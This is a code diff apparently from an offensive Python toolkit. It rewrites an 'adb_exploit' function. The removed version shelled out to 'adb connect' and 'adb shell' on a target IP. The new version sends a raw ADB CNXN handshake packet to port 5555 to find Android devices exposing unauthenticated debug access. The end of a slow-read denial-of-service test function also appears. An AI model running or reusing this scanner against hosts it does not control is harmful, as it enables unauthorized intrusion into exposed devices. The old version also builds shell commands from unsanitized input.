@@ -871,25 +871,14 @@ def slow_read_test(u,port=80,logs=True,timeout=5,duration=180,returning=False,ra
    print("==>connection closed at: {} seconds".format(int(time.time()-ti)))
   if returning==True:
    return int(time.time()-ti)
-def adb_exploit(u,port=5555,adb_path="adb"):
- #if you are on linux, you can skip those comments ;)
- #if you are on windows, you should set the "adb_path" with the full currect path to "adb.exe" and replace "\" with "\\" and delete ".exe" 
-
- #for example, i have the binaries on this location:
-    
- #C:\Users\user\Desktop\adb\adb.exe
-
- #so i do this:
-    
- #bane.adb_exploit('XXX.XXX.XXX.XXX',adb_path="C:\\Users\\user\\Desktop\\adb\\adb")
-
- try:
-  #https://stackoverflow.com/questions/14654718/how-to-use-adb-shell-when-multiple-devices-are-connected-fails-with-error-mor
-  a="{} connect {}:{} && {} -s {}:{} shell echo ala_is_king && {} disconnect {}:{}".format(adb_path,u,port,adb_path,u,port,adb_path,u,port)
-  d = subprocess.Popen(a,shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-  r=d.communicate()
-  if 'ala_is_king' in str(r[0]):
-     return True
- except Exception as e:
-  pass
- return False
+def adb_exploit(u,timeout=5,port=5555):
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(timeout)
+        s.connect((u,port))
+        s.send(b"\x43\x4e\x58\x4e\x00\x00\x00\x01\x00\x10\x00\x00\x07\x00\x00\x00\x32\x02\x00\x00\xbc\xb1\xa7\xb1\x68\x6f\x73\x74\x3a\x3a\x00") 
+        if "product.name=" in str(s.recv(4096)):
+            return True
+    except:
+        pass
+    return False
